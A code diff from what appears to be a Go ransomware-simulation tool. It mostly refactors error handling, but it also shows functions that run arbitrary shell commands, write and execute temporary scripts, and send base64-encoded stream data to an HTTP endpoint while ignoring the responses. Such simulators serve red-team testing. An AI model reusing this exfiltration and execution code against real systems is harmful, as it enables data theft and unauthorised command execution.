@@ -14,7 +14,7 @@ import (
 	"strings"
 	"time"
 
-	hl "gitlab.com/mjwhitta/hilighter"
+	"gitlab.com/mjwhitta/errors"
 )
 
 // ExecuteScript will run shell commands using the provided method, as
@@ -64,7 +64,7 @@ func ExecuteScript(
 	case "zsh":
 		return executeShell("zsh", cmds)
 	default:
-		return "", hl.Errorf("ransimware: unsupported method")
+		return "", errors.Newf("unsupported method: %s", method)
 	}
 }
 
@@ -75,14 +75,13 @@ func executeShell(shell string, cmds []string) (string, error) {
 
 	// Run cmds
 	for _, cmd := range cmds {
-		o, e = exec.Command(shell, "-c", cmd).Output()
+		if o, e = exec.Command(shell, "-c", cmd).Output(); e != nil {
+			e = errors.Newf("command \"%s\" failed: %w", cmd, e)
+			return strings.Join(out, "\n"), e
+		}
 
 		if len(o) > 0 {
 			out = append(out, strings.TrimSpace(string(o)))
-		}
-
-		if e != nil {
-			return strings.Join(out, "\n"), e
 		}
 	}
 
@@ -104,18 +103,24 @@ func executeShellScript(
 
 	// Make script executable
 	if e = os.Chmod(name, os.ModePerm); e != nil {
+		e = errors.Newf("failed to make script executable: %w", e)
 		return "", e
 	}
 
 	// Run shell script
 	o, e = exec.Command(name).Output()
 
-	// Clean up if requested
+	// Clean up, if requested
 	if clean {
 		os.Remove(name)
 	}
 
-	return strings.TrimSpace(string(o)), e
+	// Check for error
+	if e != nil {
+		return "", errors.Newf("commnd \"%s\" failed: %w", name, e)
+	}
+
+	return strings.TrimSpace(string(o)), nil
 }
 
 // HTTPExfil will return a function pointer to an ExfilFunc that
@@ -142,7 +147,7 @@ func HTTPExfil(
 			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
 				return nil
 			} else if e != nil {
-				return e
+				return errors.Newf("failed to read data: %w", e)
 			}
 
 			// Create request
@@ -153,6 +158,7 @@ func HTTPExfil(
 				bytes.NewBuffer([]byte(path+" "+b64)),
 			)
 			if e != nil {
+				e = errors.Newf("failed to craft HTTP request: %w", e)
 				return e
 			}
 
@@ -161,7 +167,7 @@ func HTTPExfil(
 				req.Header.Set(k, v)
 			}
 
-			// Send Message
+			// Send Message and ignore response or errors
 			http.DefaultClient.Do(req)
 		}
 	}
@@ -177,7 +183,7 @@ func WallpaperNotify(
 	clean bool,
 ) NotifyFunc {
 	return func() error {
-		return hl.Errorf("ransimware: unsupported OS")
+		return errors.New("unsupported OS")
 	}
 }
 
@@ -187,14 +193,14 @@ func writeScript(name string, cmds []string) error {
 
 	// Open script
 	if f, e = os.Create(name); e != nil {
-		return e
+		return errors.Newf("failed to create %s: %w", name, e)
 	}
 	defer f.Close()
 
 	// Write script
 	for _, cmd := range cmds {
 		if _, e = f.WriteString(cmd + "\n"); e != nil {
-			return e
+			return errors.Newf("failed to write to %s: %w", name, e)
 		}
 	}
 
